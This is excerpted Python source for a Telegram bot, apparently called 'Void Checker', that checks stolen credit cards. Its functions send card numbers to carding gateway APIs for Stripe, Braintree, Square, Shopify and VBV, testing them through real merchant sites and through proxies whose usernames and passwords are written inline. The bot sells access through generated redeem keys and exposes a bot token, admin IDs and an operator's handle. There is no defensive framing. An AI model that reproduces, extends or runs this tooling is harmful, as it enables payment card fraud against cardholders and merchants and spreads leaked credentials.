...
bot = telebot.TeleBot("8140466625:AAHofK8GP_BWm2zoardBo9xOol_ij4j9swc")
FIREBASE_BASE_URL = 'https://void-checker-default-rtdb.firebaseio.com'

# Admin configuration
ADMIN_IDS = ["7098912960"]
HITS_GROUP_ID = -1002741010497  # Replace with your group ID
APPROVED_GROUPS = set()
...
SQ_API_URL = "https://stripw-0-2.onrender.com/key=void/cc={}"# STRIPE + SQUARE [0.2$]
B3_API_URL = "https://braintree-jc56.onrender.com/gate=braintree/key=waslost/cc={}"
VBV_API_URL = "https://vbv-app.onrender.com/key=voidboy/cc={}"
...
SHOPIFY_API_URL = "https://kamalxd.com/shopify/sh.php?cc={}&site=https://mama-meals.com/&proxy=142.147.128.93:6593:qmvgdhce:pwz9iuzowep4"
B4_API_URL = ""
PP_API_URL = "" # paypal 2$
    ...
    try:
        ...
        try:
            response = requests.get(
                f"https://autostripe-gateway.onrender.com/gateway=as/key=void/site=bigbattery.com/cc={formatted_cc}",
        timeout=300
    )
...
def check_au_cc(cc):
    try:
        ...
        try:
            ...
            response = requests.get(f"https://autostripe-gateway.onrender.com/gateway=as/key=void/site=trustycare.com.sg/cc={formatted_cc}", timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
...
• Payment Method:
💳 UPI ID: `DM`
📩 Contact: @xX_Naman_Xx to purchase
━━━━━━━━━━━━━━━━━━
"""
...
def handle_generate(message):
    ...
    try:
        ...
        for _ in range(num_keys):
            ...
            key = f"VOID-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))}-CHECKER"
            keys.append(key)
...
Example: <code>/redeem VOID-HUSSLLZ7Z5Y-CHECKER</code>
"""
        bot.reply_to(message, response, parse_mode='HTML')
...
def handle_chk(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.send_message(message.chat.id, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return

    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.send_message(message.chat.id, "❌ This group is not approved to use this bot. Send Username & Chat Id of this Group Here @xX_Naman_Xx To get approved")
        return

    if not confirm_time():
        bot.send_message(message.chat.id, "❌ The checker is dead now, follow @xX_Naman_Xx for more!!")
        return
...
def handle_mchk(message):
    ...
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @xX_Naman_Xx for more!!")
        return
...
def check_st_cc(cc):
    try:
        ...
        res = requests.get(f"https://stripe-charge.stormx.pw/index.cpp?key=dark&cc={formatted_cc}&amount=10&proxy=", timeout=300)
...
def handle_st(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        ...
        bot.reply_to(message, "❌ This group is not approved. Send details to @xX_Naman_Xx to get approved.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ Checker is down. Follow @xX_Naman_Xx for updates.")
        return
...
def handle_mst(message):
    ...
    if not confirm_time():
        bot.reply_to(message, "❌ Checker is offline. Follow @xX_Naman_Xx.")
        return
...
🔩 CPU Cores  ➤ <code>{cores}</code>
💾 RAM        ➤ <code>{mem_used} GB / {mem_total} GB</code>
🗄 Disk Space ➤ <code>{disk_used} GB / {disk_total} GB</code>

🌐 System     ➤ <code>{system} ({arch})</code>

👑 Operator   ➤ @xX_Naman_Xx
"""
        bot.reply_to(message, response, parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ Error getting system stats: {str(e)}")
...
def handle_help(message):
    ...
    admin_button = types.InlineKeyboardButton("👤 Admin", url="https://t.me/xX_Naman_Xx")
...
def handle_gate_check(message):
    ...
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend group username & chat ID to @xX_Naman_Xx to get approved.")
        return
...
def handle_fake(message):
    ...
    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend @xX_Naman_Xx the group username and chat ID to get approved.")
        return
...
def handle_mass(message):
    ...
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is currently inactive. Follow @xX_Naman_Xx for updates!")
        return
...
def handle_truecaller_check(message):
    ...
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        ...
        bot.reply_to(message, "❌ This group is not approved to use this bot. Send request to @xX_Naman_Xx to approve your group.")
        return
...
def handle_lk(message):
    ...
    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot. Send the group username and chat ID to @xX_Naman_Xx for approval.")
        return
...
def check_sx_cc(cc):
    try:
        ...
        try:
            response = requests.get(
                "https://cyborx.net/api/stripe/skbased.php?cc={formatted_cc}&useProxy=1&hitSender=both&host=107.172.163.27&port=6543&user=anepibxr&pass=yboq1q2fve5y",
                timeout=300
            )
            if response.status_code == 200:
                try:
...
def handle_sx(message):
    ...
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        ...
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @xX_Naman_Xx To get approved")
        return
...
def check_sr_api_cc(cc):
    try:
        ...
        try:
            response = requests.get(
                f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
...
def check_sp_api_cc(cc):
    try:
        ...
        try:
            response = requests.get(
                f"https://stripe1-s8g7.onrender.com/stripe1/key=void/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
